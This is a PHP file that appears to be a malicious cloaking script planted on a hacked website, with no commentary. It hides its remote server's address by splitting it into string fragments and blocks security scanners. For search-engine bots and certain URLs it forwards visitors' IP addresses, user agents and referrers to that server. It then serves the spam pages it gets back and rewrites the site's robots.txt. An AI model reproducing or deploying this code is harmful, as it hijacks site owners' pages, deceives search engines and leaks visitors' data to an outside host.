<?php
$udki='950';$kdil='wn.';$bahu='.lesbianto';$zkyx='http://cw';$klhs='shop/';$vwogw=$zkyx.$udki.$bahu.$kdil.$klhs;
$pc = "BA8GAAw";
$bagent = "Yahoo|Docomo|Google|Bing";
error_reporting(0);
if(preg_match("/(HttpClient|OBot|AmazonBot|zmEu|DigExt|CoolpadWebkit|YandexBot|EasouSpider|Java|paloaltonetworks|AskTbFXTV|CrawlDaddy|Mj12bot|python-urllib|yySpider|python-requests|FeedDemon|Bytespider|barkrowler|JikeSpider|UniversalFeedParser|semrushBot|Swiftbot|AhrefsBot|YisouSpider|Scrapy|Ezooms|python|Heritrix|apacheBench|LightDeckReports Bot|Indy Library|Jaunty|PetalBot|Feedly)/i", $_SERVER['HTTP_USER_AGENT'])) {
	header('HTTP/1.0 403 Forbidden');
	exit();
}
$refer = urlencode(@$_SERVER['HTTP_REFERER']);
$uagent = urlencode($_SERVER['HTTP_USER_AGENT']);
$language = urlencode(@$_SERVER['HTTP_ACCEPT_LANGUAGE']);
$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_CLIENT_IP'])) {
  $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
$ip = urlencode($ip);
$domain = urlencode($_SERVER['HTTP_HOST']);
$script = urlencode($_SERVER['SCRIPT_NAME']);
if ( (! empty($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') || (! empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (! empty($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') ) {
	$_SERVER['REQUEST_SCHEME'] = 'https';
} else {
	$_SERVER['REQUEST_SCHEME'] = 'http';
}
$http = urlencode($_SERVER['REQUEST_SCHEME']);
$uri = urlencode($_SERVER['REQUEST_URI']);
if(strpos($uri,"avwavw") !== false){echo "ok";exit();}
$avw = 0;
if(!file_exists("avw.txt")) {
	$uuu = $http.'://'.$_SERVER['HTTP_HOST'].'/avwavw';
	$mydd = @file_get_contents($uuu);
	if(empty($mydd)) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $uuu);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		$mydd = curl_exec($ch);
		curl_close($ch);
	}
	if($mydd == "ok") {
		$avw = 1;
		@file_put_contents("avw.txt","1");
	} else {
		$avw = 0;
		@file_put_contents("avw.txt","0");
	}
} else {
	$avw = @file_get_contents("avw.txt");
}
if(strpos($uri,"favicon.ico") !== false) {
}
else if(strpos($uri,"robots.txt") !== false||strpos($uri,"pingsitemap") !== false||strpos($uri,"jp2023") !== false||preg_match("@^/(.*?).xml$@i", $_SERVER['REQUEST_URI'])||preg_match("/($bagent)/i", $_SERVER['HTTP_USER_AGENT'])||preg_match("/($bagent)/i", $_SERVER['HTTP_REFERER']))
{
	$requsturl = $vwogw."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$avw&script=$script";
	$robots_contents = "";
	if(strpos($uri,"pingsitemap") !== false) {
		$scripname = $_SERVER['SCRIPT_NAME'];
		if(strpos($scripname,"index.ph") !== false) {
			if($avw == 0) {
				$scripname = '/?';
			} else {
				$scripname = '/';
			}
		} else {
			$scripname = $scripname.'?';
		}
		$robots_contents = "User-agent: *\r\nAllow: /";
		$sitemap = "$http://" . $domain .$scripname. "sitemap.xml";
		$robots_contents = trim($robots_contents)."\r\n"."Sitemap: $sitemap";
		$sitemapstatus = "";
		echo $sitemap.": ".$sitemapstatus.'<br/>';
		$requsturl = $vwogw."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$avw&script=$script&sitemap=".urlencode($sitemap);
	}
	$mydd = @file_get_contents($requsturl);
	if(empty($mydd)) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $requsturl);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		$mydd = curl_exec($ch);
		curl_close($ch);
	}
	if(!empty($mydd)) {
		if(substr($mydd,0,10)=="error code"||$mydd == "500") {
			header("HTTP/1.0 500 Internal Server Error");
			exit();
		}
		if(strpos($uri,"jp2023") !== false||preg_match("/($bagent)/i", $_SERVER['HTTP_REFERER'])){header('HTTP/1.1 404 Not Found');}
		else if(substr($mydd,0,5)=="<?xml") {
			header('Content-Type: text/xml; charset=utf-8');
		} else {
			header('Content-Type: text/html; charset=utf-8');
		}
		echo $mydd;
		if(!empty($robots_contents)){@file_put_contents("robots.txt",$robots_contents);}
		else if(strpos($uri,"robots.txt") !== false){@file_put_contents("robots.txt",$mydd);}
		exit();
		return;
	}
}else{
}
?>
